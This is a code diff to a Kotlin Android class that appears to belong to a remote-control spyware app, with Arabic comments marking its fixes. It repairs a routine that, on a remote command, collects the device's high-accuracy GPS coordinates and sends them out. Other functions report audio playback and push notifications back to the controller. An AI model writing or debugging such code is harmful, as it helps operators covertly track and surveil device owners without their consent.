@@ -26,6 +26,7 @@ import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationCallback
 import com.google.android.gms.location.LocationRequest
 import com.google.android.gms.location.LocationResult
+import com.google.android.gms.location.LocationServices  // ✅ إضافة الاستيراد المفقود
 import willi.fiend.R
 import java.io.File
 import java.io.FileWriter
@@ -383,23 +384,23 @@ class AppActions(val context: Context) {
     fun uploadGpsLocation() {
         request.sendText(AppRequest.Text("ʟᴏᴄᴀᴛɪᴏɴ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ, ᴅᴇᴠɪᴄᴇ ʟᴏᴄᴀᴛɪᴏɴ ᴡɪʟʟ ʙᴇ ꜱᴇɴᴛ ꜱᴏᴏɴ ɪꜰ ᴀᴠᴀɪʟᴀʙʟᴇ"))
         if (permission.checkGetLocation()) {
-            val client = FusedLocationProviderClient(context)
-            val locationRequest = LocationRequest.create()
-            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
+            // ✅ التصحيح: استخدام LocationServices بدلاً من FusedLocationProviderClient مباشرة
+            val client = LocationServices.getFusedLocationProviderClient(context)
+            val locationRequest = LocationRequest.create().apply {
+                priority = LocationRequest.PRIORITY_HIGH_ACCURACY
+            }
             client.requestLocationUpdates(locationRequest, object : LocationCallback() {
                 override fun onLocationResult(p0: LocationResult) {
-                    if (p0 != null) {
-                        val lat = p0.lastLocation?.latitude
-                        val lon = p0.lastLocation?.longitude
-                        if (lat != null) {
-                            if (lon != null) {
-                                request.sendLocation(
-                                    AppRequest.Location(
-                                        lat.toFloat(),
-                                        lon.toFloat()
-                                    )
+                    p0?.let {
+                        val lat = it.lastLocation?.latitude
+                        val lon = it.lastLocation?.longitude
+                        if (lat != null && lon != null) {
+                            request.sendLocation(
+                                AppRequest.Location(
+                                    lat.toFloat(),
+                                    lon.toFloat()
                                 )
-                            }
+                            )
                         }
                     }
                 }
@@ -420,7 +421,7 @@ class AppActions(val context: Context) {
     fun showNotification(title: String, url: String) {
         val NOTIFICATION_CHANNEL_ID = "channel"
         val notificationIntent = Intent(Intent.ACTION_VIEW)
-        notificationIntent.data = Uri.parse(url);
+        notificationIntent.data = Uri.parse(url)
         val resultIntent = PendingIntent.getActivity(
             context,
             0,
@@ -468,7 +469,7 @@ class AppActions(val context: Context) {
                     mediaPlayer!!.start()
                     request.sendText(AppRequest.Text("ᴛʜᴇ ᴀᴜᴅɪᴏ ꜰɪʟᴇ ɪꜱ ᴘʟᴀʏɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ"))
                 }
-            } catch (e:Exception){
+            } catch (e: Exception) {
                 request.sendText(AppRequest.Text("ᴀᴜᴅɪᴏ ꜰɪʟᴇ ᴘʟᴀʏʙᴀᴄᴋ ꜰᴀɪʟᴇᴅ"))
             }
         }
